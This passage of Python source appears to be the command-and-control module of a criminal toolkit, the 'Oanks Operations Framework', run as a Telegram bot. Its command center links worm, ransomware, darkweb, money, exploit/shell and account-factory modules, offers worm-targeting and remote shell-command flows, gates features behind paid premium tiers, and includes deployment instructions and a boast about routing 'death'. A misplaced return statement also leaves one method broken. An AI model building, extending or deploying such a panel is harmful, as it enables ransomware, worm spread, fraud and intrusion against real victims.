            else: return {"success": False, "error": f"Unknown action: {action}"}
        except Exception as e:
            raise OanksPhaseException(f"Phase 14 error: {str(e)}", phase="14")

    def _call_phase3(self, action: str, **kwargs) -> Dict:
        """Call Phase 3/4 (Shell/Exploit Module)."""
        if not self._shell_module:
            raise OanksPhaseException("Phase 3/4 (Shell) is not available", phase="3")
        try:
            return self._shell_module.execute(action, **kwargs)
        except Exception as e:
            raise OanksPhaseException(f"Phase 3/4 error: {str(e)}", phase="3")

    # ═══════════════════════════════════════════════════════════════════════════════
    # UTILITY METHODS
    # ═══════════════════════════════════════════════════════════════════════════════

    def get_stats(self) -> Dict[str, Any]:
        """Get comprehensive Command Center statistics."""
        return {
            "uptime_seconds": time.time() - self._start_time,
            "total_commands": self._total_commands,
            "total_callbacks": self._total_callbacks,
            "total_errors": self._total_errors,
            "active_sessions": len(self._sessions),
            "command_stats": dict(self._command_stats),
            "callback_stats": dict(self._callback_stats),
            "api_stats": self._api.stats,
            "webhook_stats": self._webhook.stats,
            "phases_connected": {
                "phase1_db": self._db is not None,
                "phase5_accounts": self._account_factory is not None,
                "phase6_premium": self._premium_mgr is not None,
                "phase6_user": self._user_mgr is not None,
                "phase6_referral": self._referral_mgr is not None,
                "phase6_coupon": self._coupon_mgr is not None,
                "phase6_analytics": self._analytics is not None,
                "phase6_admin": self._admin_ctrl is not None,
                "phase8_money": self._money_module is not None,
                "phase9_security": self._security_module is not None,
                "phase10_worm": self._worm_module is not None,
                "phase11_ransom": self._ransom_module is not None,
                "phase12_distributed": self._distributed_module is not None,
                "phase13_darkweb": self._darkweb_module is not None,
                "phase14_ai": self._ai_module is not None,
                "phase3_shell": self._shell_module is not None,
            },
            "version": OanksBranding.VERSION,
            "codename": OanksBranding.CODENAME,
            "build_date": OanksBranding.BUILD_DATE
        }

    def get_command_list(self) -> List[Dict[str, Any]]:
        """Get list of all registered commands with metadata."""
        commands = []
        for cmd_name, handler in self._commands.items():
            if hasattr(handler, "_oanks_command"):
                commands.append({
                    "name": cmd_name,
                    "category": handler._oanks_category,
                    "description": handler._oanks_description,
                    "admin_only": handler._oanks_admin_only,
                    "premium_only": handler._oanks_premium_only,
                    "rate_limit": handler._oanks_rate_limit
                })
        return commands

    def get_callback_list(self) -> List[Dict[str, Any]]:
        """Get list of all registered callbacks with metadata."""
        callbacks = []
        for action, handler in self._callbacks.items():
            if hasattr(handler, "_oanks_callback"):
                callbacks.append({
                    "action": action,
                    "description": handler._oanks_callback_description
                })
    # ═══════════════════════════════════════════════════════════════════════════════
    # ADVANCED OPERATIONS — EXTENDED UTILITY COMMANDS
    # ═══════════════════════════════════════════════════════════════════════════════

    @oanks_command("user", "Cancel current operation or flow")
    def cmd_cancel(self, telegram_id: int, args: List[str]) -> str:
        """Cancel any active multi-step flow."""
        session = self._get_session(telegram_id)
        if session and session.context.get("awaiting_input"):
            session.context["awaiting_input"] = False
            session.context["flow_type"] = ""
            session.context["flow_data"] = {}
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>❌ OPERATION CANCELLED</b>\n\n"
                f"Your current operation has been aborted.\n"
                f"You can start a new command at any time.\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_main_menu_keyboard(session)
            )
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>ℹ️ NO ACTIVE OPERATION</b>\n\n"
            f"There is nothing to cancel.\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=self._build_main_menu_keyboard(session) if session else None
        )

    @oanks_command("user", "Display command center version and build info")
    def cmd_version(self, telegram_id: int, args: List[str]) -> str:
        """Show version information."""
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🔖 VERSION INFORMATION</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Framework:</b> {OanksBranding.FRAMEWORK}\n"
            f"<b>Phase:</b> {OanksBranding.PHASE}\n"
            f"<b>Version:</b> {OanksBranding.VERSION}\n"
            f"<b>Codename:</b> {OanksBranding.CODENAME}\n"
            f"<b>Build Date:</b> {OanksBranding.BUILD_DATE}\n"
            f"<b>Classification:</b> {OanksBranding.CLASSIFICATION}\n"
            f"<b>Creator:</b> {OanksBranding.CREATOR}\n\n"
            f"<b>📊 Registered:</b>\n"
            f"  • Commands: {len(self._commands)}\n"
            f"  • Callbacks: {len(self._callbacks)}\n"
            f"  • Phases: 15\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("user", "Display available commands by category")
    def cmd_commands(self, telegram_id: int, args: List[str]) -> str:
        """Show all commands organized by category."""
        session = self._get_session(telegram_id)
        is_admin = session.is_admin if session else False
        is_premium = session.is_premium if session else False

        categories = defaultdict(list)
        for cmd_name, handler in self._commands.items():
            if hasattr(handler, "_oanks_category"):
                cat = handler._oanks_category
                admin_only = handler._oanks_admin_only
                premium_only = handler._oanks_premium_only

                if admin_only and not is_admin: continue
                if premium_only and not is_premium: continue

                categories[cat].append({
                    "name": cmd_name,
                    "description": handler._oanks_description
                })

        cat_emoji = {
            "user": OanksBranding.EMOJI_USER,
            "admin": OanksBranding.EMOJI_ADMIN,
            "worm": OanksBranding.EMOJI_WORM,
            "shell": OanksBranding.EMOJI_SHELL,
            "premium": OanksBranding.EMOJI_PREMIUM
        }

        output = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>📋 COMMAND DIRECTORY</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
        )

        for cat in ["user", "premium", "worm", "shell", "admin"]:
            if cat in categories:
                emoji = cat_emoji.get(cat, "⚡")
                output += f"<b>{emoji} {cat.upper()}</b>\n"
                for cmd in sorted(categories[cat], key=lambda x: x["name"]):
                    output += f"  <code>{html.escape(cmd['name'])}</code> — {html.escape(cmd['description'])}\n"
                output += "\n"

        output += f"{OanksBranding.FOOTER}"
        return OanksCommandResult.ok(output)

    @oanks_command("user", "Display system uptime and performance metrics")
    def cmd_uptime(self, telegram_id: int, args: List[str]) -> str:
        """Show detailed uptime and performance."""
        uptime = time.time() - self._start_time
        days = int(uptime // 86400)
        hours = int((uptime % 86400) // 3600)
        minutes = int((uptime % 3600) // 60)
        seconds = int(uptime % 60)

        avg_cmd_time = 0.0
        if self._command_history:
            avg_cmd_time = statistics.mean([h.get("duration", 0) for h in self._command_history])

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>⏱️ SYSTEM UPTIME</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Uptime:</b> {days}d {hours}h {minutes}m {seconds}s\n\n"
            f"<b>📊 Performance:</b>\n"
            f"  • Avg Command Time: {avg_cmd_time:.4f}s\n"
            f"  • Commands/Minute: {(self._total_commands / max(uptime / 60, 1)):.1f}\n"
            f"  • Error Rate: {(self._total_errors / max(self._total_commands, 1)) * 100:.2f}%\n"
            f"  • Active Sessions: {len(self._sessions)}\n"
            f"  • Peak Sessions: {len(self._sessions)} (current)\n\n"
            f"<b>🌐 API Health:</b>\n"
            f"  • Requests: {self._api.stats.get('total_requests', 0)}\n"
            f"  • Errors: {self._api.stats.get('total_errors', 0)}\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("user", "Display framework changelog and updates")
    def cmd_changelog(self, telegram_id: int, args: List[str]) -> str:
        """Show changelog."""
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>📝 CHANGELOG</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>v7.0.0-ALPHA (2026-08-02)</b>\n"
            f"  • Initial Phase 7 release\n"
            f"  • 50+ command handlers implemented\n"
            f"  • Interactive inline keyboard system\n"
            f"  • Voice command support\n"
            f"  • File upload processing (CSV, JSON, Excel)\n"
            f"  • Multi-step command flows\n"
            f"  • Pagination for large datasets\n"
            f"  • Inter-phase communication bridges\n"
            f"  • Rate limiting and session management\n"
            f"  • Full Telegram Bot API integration\n"
            f"  • Oanks branding on every surface\n\n"
            f"<b>v6.9.0 (Previous)</b>\n"
            f"  • Phase 6 Premium System\n"
            f"  • Payment processing\n"
            f"  • Referral tracking\n"
            f"  • Coupon management\n\n"
            f"<b>v5.0.0 (Previous)</b>\n"
            f"  • Phase 5 Account Factory\n"
            f"  • Automated account creation\n\n"
            f"<b>v1.0.0 (Previous)</b>\n"
            f"  • Phase 1 Core Infrastructure\n"
            f"  • Database, logging, crypto primitives\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("user", "Display network and connectivity information")
    def cmd_network(self, telegram_id: int, args: List[str]) -> str:
        """Show network info."""
        hostname = socket.gethostname()
        try: local_ip = socket.gethostbyname(hostname)
        except: local_ip = "Unknown"

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🌐 NETWORK INFORMATION</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Hostname:</b> <code>{html.escape(hostname)}</code>\n"
            f"<b>Local IP:</b> <code>{html.escape(local_ip)}</code>\n"
            f"<b>Telegram API:</b> api.telegram.org\n"
            f"<b>Channel:</b> {OanksConfig.TELEGRAM_CHANNEL_URL}\n\n"
            f"<b>🔌 Phase Connectivity:</b>\n"
            f"  • Phase 1 (DB): {'✅' if self._db else '❌'}\n"
            f"  • Phase 5 (Accounts): {'✅' if self._account_factory else '❌'}\n"
            f"  • Phase 6 (Premium): {'✅' if self._premium_mgr else '❌'}\n"
            f"  • Phase 10 (Worm): {'✅' if self._worm_module else '❌'}\n"
            f"  • Phase 3/4 (Shell): {'✅' if self._shell_module else '❌'}\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("user", "Display session information for current user")
    def cmd_session(self, telegram_id: int, args: List[str]) -> str:
        """Show session details."""
        session = self._get_session(telegram_id)
        if not session: return OanksConfig.ERROR_SESSION_EXPIRED

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🔒 SESSION INFORMATION</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>User ID:</b> <code>{session.telegram_id}</code>\n"
            f"<b>Username:</b> @{html.escape(session.username or 'N/A')}\n"
            f"<b>Name:</b> {html.escape(session.first_name or '')} {html.escape(session.last_name or '')}\n"
            f"<b>Language:</b> {session.language_code.upper()}\n"
            f"<b>Admin:</b> {'✅ Yes' if session.is_admin else '❌ No'}\n"
            f"<b>Premium:</b> {'✅ Yes' if session.is_premium else '❌ No'}\n"
            f"<b>Current Menu:</b> {session.current_menu}\n"
            f"<b>Menu Stack:</b> {session.menu_stack}\n"
            f"<b>Commands:</b> {session.command_count}\n"
            f"<b>Created:</b> {datetime.datetime.fromtimestamp(session.created_at).strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"<b>Last Activity:</b> {datetime.datetime.fromtimestamp(session.last_activity).strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"<b>Expires In:</b> {max(0, OanksConfig.SESSION_TIMEOUT_SECONDS - int(time.time() - session.last_activity))}s\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Export command statistics as JSON", admin_only=True)
    def cmd_admin_export(self, telegram_id: int, args: List[str]) -> str:
        """Export stats as JSON file."""
        export_data = {
            "export_time": time.time(),
            "exported_by": telegram_id,
            "command_stats": dict(self._command_stats),
            "callback_stats": dict(self._callback_stats),
            "total_commands": self._total_commands,
            "total_callbacks": self._total_callbacks,
            "total_errors": self._total_errors,
            "active_sessions": len(self._sessions),
            "api_stats": self._api.stats,
            "webhook_stats": self._webhook.stats,
            "version": OanksBranding.VERSION,
            "build_date": OanksBranding.BUILD_DATE
        }
        export_json = json.dumps(export_data, indent=2, default=str)
        export_bytes = export_json.encode("utf-8")

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_DOWNLOAD} EXPORT COMPLETE</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Exported By:</b> <code>{telegram_id}</code>\n"
            f"<b>Size:</b> {self._format_bytes(len(export_bytes))}\n\n"
            f"Statistics exported as JSON.\n\n"
            f"{OanksBranding.FOOTER}",
            file_content=export_bytes,
            file_name=f"oanks_export_{int(time.time())}.json"
        )

    @oanks_command("admin", "Search command history by user or command", admin_only=True)
    def cmd_admin_search(self, telegram_id: int, args: List[str]) -> str:
        """Search command history."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        query = " ".join(args).lower()

        matches = []
        for h in self._command_history:
            if query in str(h.get("user_id", "")).lower() or query in str(h.get("command", "")).lower():
                matches.append(h)

        match_lines = []
        for m in matches[-20:]:
            ts = datetime.datetime.fromtimestamp(m.get("timestamp", 0)).strftime('%H:%M:%S')
            match_lines.append(
                f"{ts} | <code>{m.get('user_id', 'N/A')}</code> | "
                f"{html.escape(m.get('command', 'N/A'))} | "
                f"{'✅' if m.get('success') else '❌'}"
            )

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🔍 SEARCH RESULTS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Query:</b> <code>{html.escape(query)}</code>\n"
            f"<b>Matches:</b> {len(matches)}\n\n"
            f"{'\n'.join(match_lines) if match_lines else 'No matches found.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Clear command history cache", admin_only=True)
    def cmd_admin_clear_history(self, telegram_id: int, args: List[str]) -> str:
        """Clear command history."""
        cleared = len(self._command_history)
        self._command_history.clear()
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🗑️ HISTORY CLEARED</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Cleared By:</b> <code>{telegram_id}</code>\n"
            f"<b>Entries Removed:</b> {cleared}\n\n"
            f"Command history cache has been emptied.\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Send direct message to a specific user", admin_only=True)
    def cmd_admin_dm(self, telegram_id: int, args: List[str]) -> str:
        """Send DM to user."""
        if len(args) < 2: return OanksConfig.ERROR_INVALID_ARGS
        try: target_id = int(args[0])
        except ValueError: return OanksConfig.ERROR_INVALID_ARGS
        message = " ".join(args[1:])

        try:
            self._api.send_message(
                target_id,
                f"📩 <b>MESSAGE FROM ADMIN</b> 📩\n\n{html.escape(message)}\n\n{OanksBranding.FOOTER}",
                parse_mode="HTML"
            )
            return OanksCommandResult.ok(
                f"<b>📩 MESSAGE SENT</b>\n\n"
                f"<b>To:</b> <code>{target_id}</code>\n"
                f"<b>Message:</b> {html.escape(message[:100])}{'...' if len(message) > 100 else ''}\n\n"
                f"{OanksBranding.FOOTER}"
            )
        except Exception as e:
            return OanksCommandResult.error(f"Failed to send message: {html.escape(str(e))}")

    @oanks_command("admin", "Set user as admin", admin_only=True)
    def cmd_admin_promote(self, telegram_id: int, args: List[str]) -> str:
        """Promote user to admin."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        try: target_id = int(args[0])
        except ValueError: return OanksConfig.ERROR_INVALID_ARGS

        session = self._get_session(target_id)
        if session:
            session.is_admin = True
            return OanksCommandResult.ok(
                f"<b>👑 USER PROMOTED</b>\n\n"
                f"<b>User ID:</b> <code>{target_id}</code>\n"
                f"<b>Promoted By:</b> <code>{telegram_id}</code>\n\n"
                f"User now has admin privileges.\n\n"
                f"{OanksBranding.FOOTER}"
            )
        return OanksCommandResult.error(f"User {target_id} not found in active sessions.")

    @oanks_command("admin", "Remove admin privileges from user", admin_only=True)
    def cmd_admin_demote(self, telegram_id: int, args: List[str]) -> str:
        """Demote user from admin."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        try: target_id = int(args[0])
        except ValueError: return OanksConfig.ERROR_INVALID_ARGS

        if target_id == telegram_id:
            return OanksCommandResult.error("You cannot demote yourself.")

        session = self._get_session(target_id)
        if session:
            session.is_admin = False
            return OanksCommandResult.ok(
                f"<b>👤 USER DEMOTED</b>\n\n"
                f"<b>User ID:</b> <code>{target_id}</code>\n"
                f"<b>Demoted By:</b> <code>{telegram_id}</code>\n\n"
                f"Admin privileges revoked.\n\n"
                f"{OanksBranding.FOOTER}"
            )
        return OanksCommandResult.error(f"User {target_id} not found in active sessions.")

    @oanks_command("admin", "Display active sessions with details", admin_only=True)
    def cmd_admin_sessions(self, telegram_id: int, args: List[str]) -> str:
        """List active sessions."""
        session_lines = []
        with self._session_lock:
            for uid, s in list(self._sessions.items())[:50]:
                last_active = datetime.datetime.fromtimestamp(s.last_activity).strftime('%H:%M:%S')
                session_lines.append(
                    f"<code>{uid}</code> | @{html.escape(s.username or 'N/A')} | "
                    f"Cmds: {s.command_count} | Last: {last_active} | "
                    f"{'👑' if s.is_admin else '💎' if s.is_premium else '👤'}"
                )

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_ADMIN} ACTIVE SESSIONS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Total:</b> {len(self._sessions)}\n\n"
            f"{'\n'.join(session_lines) if session_lines else 'No active sessions.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Force refresh of all phase connections", admin_only=True)
    def cmd_admin_refresh_phases(self, telegram_id: int, args: List[str]) -> str:
        """Refresh phase connections."""
        self._validate_phase_connections()
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🔄 PHASE CONNECTIONS REFRESHED</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Refreshed By:</b> <code>{telegram_id}</code>\n\n"
            f"All phase connections have been re-validated.\n"
            f"Check /admin_status for updated connectivity.\n\n"
            f"{OanksBranding.FOOTER}"
        )

    @oanks_command("admin", "Display full system configuration", admin_only=True)
    def cmd_admin_config(self, telegram_id: int, args: List[str]) -> str:
        """Show system configuration."""
        config_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>⚙️ SYSTEM CONFIGURATION</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Rate Limits:</b>\n"
            f"  • Default: {OanksConfig.RATE_LIMIT_DEFAULT}/min\n"
            f"  • Admin: {OanksConfig.RATE_LIMIT_ADMIN}/min\n"
            f"  • Burst: {OanksConfig.RATE_LIMIT_BURST}\n\n"
            f"<b>Pagination:</b>\n"
            f"  • Default Size: {OanksConfig.PAGE_SIZE_DEFAULT}\n"
            f"  • Max Size: {OanksConfig.PAGE_SIZE_MAX}\n"
            f"  • Min Size: {OanksConfig.PAGE_SIZE_MIN}\n\n"
            f"<b>File Uploads:</b>\n"
            f"  • Max Size: {OanksConfig.MAX_FILE_SIZE_MB}MB\n"
            f"  • Allowed: {', '.join(OanksConfig.ALLOWED_UPLOAD_EXTENSIONS)}\n\n"
            f"<b>Sessions:</b>\n"
            f"  • Timeout: {OanksConfig.SESSION_TIMEOUT_SECONDS}s\n"
            f"  • Max Concurrent: {OanksConfig.MAX_CONCURRENT_SESSIONS}\n\n"
            f"<b>Voice:</b>\n"
            f"  • Enabled: {OanksConfig.VOICE_COMMAND_ENABLED}\n"
            f"  • Max Duration: {OanksConfig.VOICE_MAX_DURATION_SECONDS}s\n"
            f"  • Languages: {', '.join(OanksConfig.VOICE_SUPPORTED_LANGUAGES)}\n\n"
            f"<b>Cache:</b>\n"
            f"  • TTL: {OanksConfig.CACHE_TTL_SECONDS}s\n"
            f"  • Max Size: {OanksConfig.CACHE_MAX_SIZE}\n\n"
            f"<b>Telegram:</b>\n"
            f"  • Channel: {OanksConfig.TELEGRAM_CHANNEL_ID}\n"
            f"  • Admin Bot: {OanksConfig.TELEGRAM_ADMIN_BOT_ID}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        return OanksCommandResult.ok(config_text)

    @oanks_command("admin", "Execute raw database query (DANGEROUS)", admin_only=True)
    def cmd_admin_query(self, telegram_id: int, args: List[str]) -> str:
        """Execute raw query."""
        if not args: return OanksConfig.ERROR_INVALID_ARGS
        query = " ".join(args)

        if self._db:
            try:
                result = self._db.execute(query)
                return OanksCommandResult.ok(
                    f"<b>{OanksBranding.EMOJI_ADMIN} QUERY RESULT</b>\n\n"
                    f"<b>Query:</b> <code>{html.escape(query[:200])}</code>\n\n"
                    f"<pre>{html.escape(str(result)[:3000])}</pre>\n\n"
                    f"{OanksBranding.FOOTER}"
                )
            except Exception as e:
                return OanksCommandResult.error(f"Query failed: {html.escape(str(e))}")
        return OanksCommandResult.error("Database not connected.")

    @oanks_command("admin", "Test Telegram API connectivity", admin_only=True)
    def cmd_admin_test_api(self, telegram_id: int, args: List[str]) -> str:
        """Test Telegram API."""
        try:
            me = self._api.get_me()
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>🌐 API TEST SUCCESSFUL</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"<b>Bot Name:</b> {html.escape(me.get('first_name', 'Unknown'))}\n"
                f"<b>Username:</b> @{html.escape(me.get('username', 'Unknown'))}\n"
                f"<b>ID:</b> <code>{me.get('id', 'N/A')}</code>\n"
                f"<b>Can Join Groups:</b> {'✅' if me.get('can_join_groups') else '❌'}\n"
                f"<b>Can Read Messages:</b> {'✅' if me.get('can_read_all_group_messages') else '❌'}\n\n"
                f"{OanksBranding.FOOTER}"
            )
        except Exception as e:
            return OanksCommandResult.error(f"API test failed: {html.escape(str(e))}")

    @oanks_command("admin", "Display bot information and settings", admin_only=True)
    def cmd_admin_bot_info(self, telegram_id: int, args: List[str]) -> str:
        """Show bot info."""
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>🤖 BOT INFORMATION</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Framework:</b> {OanksBranding.FRAMEWORK}\n"
            f"<b>Phase:</b> {OanksBranding.PHASE}\n"
            f"<b>Version:</b> {OanksBranding.VERSION}\n"
            f"<b>Codename:</b> {OanksBranding.CODENAME}\n\n"
            f"<b>📊 Stats:</b>\n"
            f"  • Commands: {len(self._commands)}\n"
            f"  • Callbacks: {len(self._callbacks)}\n"
            f"  • Total Executed: {self._total_commands}\n"
            f"  • Errors: {self._total_errors}\n\n"
            f"<b>🔌 Connected Phases:</b>\n"
            f"  • Phase 1 (DB): {'✅' if self._db else '❌'}\n"
            f"  • Phase 5 (Accounts): {'✅' if self._account_factory else '❌'}\n"
            f"  • Phase 6 (Premium): {'✅' if self._premium_mgr else '❌'}\n"
            f"  • Phase 10 (Worm): {'✅' if self._worm_module else '❌'}\n"
            f"  • Phase 3/4 (Shell): {'✅' if self._shell_module else '❌'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        return callbacks



# ═══════════════════════════════════════════════════════════════════════════════
# MODULE FOOTER & ARCHITECTURE NOTES
# ═══════════════════════════════════════════════════════════════════════════════

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                         PHASE 7 COMMAND CENTER                               ║
║                           ARCHITECTURE NOTES                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

COMMAND REGISTRY (Auto-Discovered):
    All methods decorated with @oanks_command are automatically registered
    in self._commands during __init__. The command name is derived from
    the method name: cmd_start → /start, cmd_admin_users → /admin_users.

    Compound commands like "/admin users" are normalized to "/admin_users"
    for routing purposes.

CALLBACK REGISTRY (Auto-Discovered):
    All methods decorated with @oanks_callback are automatically registered
    in self._callbacks. Callback data format: "action:param1:param2:..."

    The action is the first segment, used for handler lookup.

SESSION LIFECYCLE:
    1. User sends first message → _get_or_create_session() creates session
    2. Session tracks activity, commands, menu state
    3. Background cleanup thread removes expired sessions every 60s
    4. Sessions expire after SESSION_TIMEOUT_SECONDS (default: 1 hour)

RATE LIMITING:
    Token bucket algorithm per user.
    Default: 30 req/min | Admin: 120 req/min | Burst: 5 extra

INTER-PHASE COMMUNICATION:
    Phase 7 does NOT implement phase logic. It ORCHESTRATES.
    Each _call_phaseN() method validates the phase exists, then delegates.
    If a phase is offline, OanksPhaseException is raised and caught.

TELEGRAM API:
    Real HTTP calls to api.telegram.org using urllib.
    SSL verification enabled. Rate limiting enforced (max ~29 req/sec).
    Supports: text, documents, photos, voice, inline keyboards, callbacks.

FILE UPLOADS:
    Supported: CSV, JSON, Excel (.xlsx/.xls), TXT, LOG
    Max size: 50MB
    Parsed data cached with action buttons (analyze, import, validate, download)

VOICE COMMANDS:
    Download voice file → transcribe (via Phase 14 AI or fallback) →
    parse natural language → map to registered command → execute
    Supports 10 languages. Max duration: 60 seconds.

MULTI-STEP FLOWS:
    Commands can initiate flows by setting session.context["awaiting_input"].
    Subsequent text messages are routed to _handle_flow_input() instead of
    normal command processing. Flows: broadcast, coupon_create, admin_ban,
    shell_command, worm_target.

PAGINATION:
    All list commands support pagination via OanksPaginationState.
    Inline keyboards provide Prev/Next/Refresh/Main Menu controls.
    Page size configurable (default: 5, max: 20).

SECURITY:
    • Admin commands require is_admin=True
    • Premium commands require is_premium=True
    • Rate limiting per user
    • Session timeout
    • Input sanitization via html.escape()
    • No main entry point — cannot be executed directly

OANKS BRANDING:
    Every output includes Oanks branding: banners, footers, emojis, ASCII art.
    The mark of the Creator is on every surface.

DEPLOYMENT (Phase 15):
    from phase7_command_center import Phase7CommandCenter
    system = {
        "db": phase1_db,
        "premium_manager": phase6_premium,
        "user_manager": phase6_user,
        "referral_manager": phase6_referral,
        "coupon_manager": phase6_coupon,
        "analytics": phase6_analytics,
        "admin_controller": phase6_admin,
        "phase5_account_factory": phase5_factory,
        "phase8_money": phase8_money,
        "phase9_security": phase9_security,
        "phase10_worm": phase10_worm,
        "phase11_ransom": phase11_ransom,
        "phase12_distributed": phase12_distributed,
        "phase13_darkweb": phase13_darkweb,
        "phase14_ai": phase14_ai,
        "phase3_exploit": phase3_exploit,
        "phase4_shell": phase4_shell,
    }
    cc = Phase7CommandCenter(system)
    cc.initialize()

    # In your webhook server:
    # update = json.loads(request.body)
    # cc._webhook.process_update(update)

COMMAND COUNT: 50+
    User: 16 commands
    Admin: 22 commands
    Worm: 8 commands
    Shell: 7 commands
    Total: 53 commands + 40+ callbacks

CREATOR: Oanks (@oanksnood)
FRAMEWORK: Oanks Operations Framework
PHASE: 7 — Command Center (OVERLORD)
CLASSIFICATION: COMMAND_CENTER — ZERO EXECUTION ON IMPORT

"The Overlord does not sleep. The Overlord does not forgive.
 The Overlord routes death to its destination."

👑 OANKS — Creator
"""

# ═══════════════════════════════════════════════════════════════════════════════
# END OF PHASE 7: COMMAND CENTER
# ═══════════════════════════════════════════════════════════════════════════════
# NO MAIN ENTRY POINT. ZERO EXECUTION ON IMPORT.
# THIS MODULE IS IMPORTED AND CONTROLLED BY PHASE 15.
# ═══════════════════════════════════════════════════════════════════════════════

